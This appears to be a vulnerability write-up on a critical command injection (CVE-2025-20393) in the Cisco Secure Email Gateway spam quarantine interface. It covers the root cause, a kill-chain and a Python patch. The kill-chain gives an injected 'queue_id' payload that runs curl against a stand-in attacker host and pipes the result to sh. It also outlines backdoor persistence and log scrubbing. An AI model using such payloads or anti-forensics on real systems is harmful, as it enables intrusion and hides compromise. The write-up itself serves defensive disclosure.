---
layout: page
title: "AsyncOS Quarantine Collapse"
id: "006"
cve: "CVE-2025-20393"
target: "Cisco Secure Email Gateway"
severity: "10.0"
pdf_file: "AOAB6.pdf"
sidebar_link: false
date_finding: "2025-12-18"
date_upload: "2025-12-25"
status: "DECLASSIFIED"
tags: [Cisco, AsyncOS, Web, EmailGateway, AuthBypass, CommandInjection, RCE, LPE, PrivEsc, Python]
credits: "Cisco Talos Intelligence Group, Cisco PSIRT"
summary: "AsyncOS Quarantine Collapse (CVE-2025-20393): A critical CVSS 10.0 vulnerability in the Cisco Secure Email Gateway (ESA/SMA) Spam Quarantine web interface."
---

## 1. The Patient

**Target:** Cisco Secure Email Gateway (ESA/SMA)  
**Component:** Spam Quarantine Web Interface (`Glass/1.0`)  
**Vector:** TCP/6025 (HTTP POST)

Cisco AsyncOS is a proprietary FreeBSD-based operating system designed to serve as a "Black Box" appliance. It is deeply integrated with enterprise SMTP relays and directory services. The specific failure occurred in the **Glass Web Layer**, a legacy interface running on Python 2.6.4 designed to handle user quarantine management.

The architecture operated on a fatal assumption: **The Illusion of Security**. Because the appliance does not offer customers direct SSH access, the developers assumed the internal environment was safe. Consequently, the web server runs with **Root privileges**, assuming that limited customer access implies limited risk.

> **The Context:** This vulnerability holds a CVSS score of **10.0**. This is the theoretical maximum for severity, defined by: **No Authentication** required, **No User Interaction** required, and a result of immediate **Root-level Command Execution**.

## 2. The Diagnosis

**Root Cause:** Improper Input Validation leading to OS Command Injection.

The flaw acts as a **Swiss Cheese Failure**, where holes in the Network, Application, and OS layers aligned perfectly. The Spam Quarantine interface accepts HTTP POST requests to manage email queues. The Python handler constructs a command string at runtime to invoke system helpers.

The failure occurs in the handling of the `queue_id` parameter:

1.  **The Claim:** The application expects `queue_id` to be a simple integer (e.g., `1005`).
2.  **The Trust:** The application trusts this input blindly. It does not validate that the input is numeric, nor does it sanitize shell metacharacters.
3.  **The Construction:** The server concatenates the user input directly into a system command string: `"/usr/bin/quarantine_helper --id " + user_input`.
4.  **The Execution:** This string is passed to `os.system()`. Because the web server runs as Root with no privilege drops, no chroot, and no seccomp filters, the injected commands execute with full system authority.

## 3. The Kill-Chain

### Phase 1: Reconnaissance & Delivery
The attacker scans for the specific fingerprint of the Spam Quarantine service: Port `6025` exposing the `Glass/1.0` server header. 
Instead of a legitimate request, the attacker constructs a payload that closes the expected command and opens a new shell execution:
* **Payload:** `action=release&queue_id=1005;curl+attacker.com/s|sh`

### Phase 2: Execution (The Breach)
The Python CGI processes the request. The underlying system executes:
`/usr/bin/quarantine_helper --id 1005; curl attacker.com/s | sh`

The result is immediate. The attacker gains a **Root Shell** (UID 0) with full filesystem access and network reachability. There is no escalation phase; execution starts at the highest privilege level.

### Phase 3: Persistence & Evasion
To maintain access without triggering alarms, the attacker utilizes **AquaShell** and **AquaPurge** techniques:
* **Persistence:** The on-disk script `index.py` is modified to act as a passive backdoor, watching for "magic" POST markers to decode hidden payloads.
* **Lateral Movement:** Tools like `Chisel` or ReverseSSH are deployed to tunnel from the DMZ into the internal network.
* **Anti-Forensics:** Logs are surgically scrubbed using `grep -v` to remove the attacker's IP address, leaving the appliance owned but the logs clean.

> **Impact:** The compromise is total. The "Black Box" nature of the appliance prevents standard EDR tools from monitoring the OS, making detection nearly impossible without external network traffic analysis.

## 4. The Fix

The remediation requires abandoning the use of shell interpreters for system calls. User input must never be concatenated into executable strings.

**Vulnerable Logic:**
```python
import os

# FATAL: "shell=True" implicit behavior.
# The system creates a /bin/sh process that parses the string.
# This allows ';', '|', and backticks to execute extra commands.
os.system("/usr/bin/quarantine_helper " + user_input)

```

**Patched Logic:**

```python
import subprocess

# SECURITY FIX: Use subprocess with a LIST of arguments.
# This invokes the binary directly (like execve), bypassing the shell.
subprocess.check_call(
  ["/usr/bin/quarantine_helper", user_input],
  shell=False
)

# Result: The system treats 'user_input' strictly as data.

```

### Developer Takeaway

**Legacy code is an attack surface.** Python 2.x is not just "legacy"; it is a liability. Security appliances are not specialâ€”they must follow the same hostile-facing rules as any public server. The reliance on "Security by Obscurity" and the assumption that internal components could run as Root because "customers can't reach them" was a design failure, not just a code bug.

**Immediate Action:**

1. **Patch:** Apply the AsyncOS December 2025 Hotfix immediately.
2. **Isolate:** Disable external access to Spam Quarantine interfaces (TCP/6025).
3. **Rebuild:** If compromised, patching is insufficient. The appliance must be rebuilt from a trusted image due to the potential for persistence.
